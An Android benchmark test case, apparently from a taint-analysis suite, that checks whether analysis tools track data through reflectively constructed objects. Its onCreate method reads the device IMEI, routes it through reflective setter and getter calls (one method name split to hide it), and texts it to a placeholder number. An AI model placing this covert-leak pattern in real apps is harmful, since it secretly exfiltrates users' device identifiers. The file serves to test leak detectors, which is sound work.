package lu.uni.snt.reflection7;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;

/**
 * @testcase_name Reflection7
 * @version 0.1
 * @author SnT, University of Luxembourg 
 * @author_mail li.li@uni.lu
 * 
 * @description A class instance is created using reflection with specific constructor (getConstructor). 
 * Sensitive data is stored using a setter in this class, read back using a getter and then leaked. 
 * No type information on the target class is used.
 * @dataflow onCreate: source -> bc.imei -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to handle constructor-based reflective class instantiations.
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String deviceid = telephonyManager.getDeviceId(); //source
		
		try {
			Class<?> cls = Class.forName("lu.uni.snt.reflection7.ConcreteClass");
			
			Object o = cls.getConstructor(String.class).newInstance("");
			
			Method m = cls.getMethod("setIme" + "i", String.class);
			m.invoke(o, deviceid);
			
			Method m2 = cls.getMethod("getImei");
			String s = (String) m2.invoke(o);
			
			SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49 1234", null, s, null, null);   //sink, leak
		} catch (InstantiationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchMethodException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
